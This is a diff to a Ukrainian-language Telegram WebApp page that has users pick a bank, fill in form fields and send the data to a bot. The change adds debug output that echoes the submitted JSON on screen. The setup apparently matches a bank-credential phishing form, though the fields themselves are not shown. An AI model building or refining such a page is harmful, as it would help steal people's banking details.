@@ -39,6 +39,7 @@
         #status.loading { display: block; background: #e0f2fe; color: #0369a1; }
         .bank-logo { font-size: 28px; font-weight: 700; text-align: center; padding: 8px 0 12px; color: #0f172a; }
         .bank-logo span { display: block; font-size: 13px; font-weight: 400; color: #64748b; }
+        .debug { font-size: 12px; color: red; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
@@ -63,6 +64,7 @@
         <button class="btn-submit" onclick="sendData()">✅ Підтвердити</button>
         <button class="btn-back" onclick="goBack()">⬅ Назад</button>
         <div id="status"></div>
+        <div id="debugInfo" class="debug"></div>
     </div>
 
     <div id="statusGlobal" style="margin-top:16px;text-align:center;font-size:13px;color:#94a3b8;">Натисніть на банк, щоб продовжити</div>
@@ -103,6 +105,13 @@
     let selectedBank = null;
     let userId = new URLSearchParams(window.location.search).get('user_id') || 'unknown';
     let tg = window.Telegram ? window.Telegram.WebApp : null;
+
+    if (tg) {
+        tg.ready();
+        document.getElementById('debugInfo').textContent = '✅ WebApp готов';
+    } else {
+        document.getElementById('debugInfo').textContent = '❌ Telegram WebApp не знайдено';
+    }
 
     function renderBanks() {
         const container = document.getElementById('bankList');
@@ -160,6 +169,7 @@
 
     function sendData() {
         const statusEl = document.getElementById('status');
+        const debugEl = document.getElementById('debugInfo');
         const fields = document.querySelectorAll('#formFields input');
         const data = {};
 
@@ -193,7 +203,9 @@
 
         if (tg) {
             try {
-                tg.sendData(JSON.stringify(data));
+                const jsonData = JSON.stringify(data);
+                debugEl.textContent = '📤 Надсилання: ' + jsonData;
+                tg.sendData(jsonData);
                 statusEl.className = 'success';
                 statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте підтвердження.';
                 document.getElementById('dot2').classList.remove('active');
@@ -208,16 +220,13 @@
             } catch(e) {
                 statusEl.className = 'error';
                 statusEl.textContent = '❌ Помилка відправки: ' + e.message;
+                debugEl.textContent = '❌ ' + e.message;
             }
         } else {
             statusEl.className = 'error';
             statusEl.textContent = '❌ Telegram WebApp не доступний. Спробуйте через бота.';
+            debugEl.textContent = '❌ WebApp не доступний';
         }
-    }
-
-    // Проверка, что WebApp загружен
-    if (tg) {
-        tg.ready();
     }
 
     renderBanks();
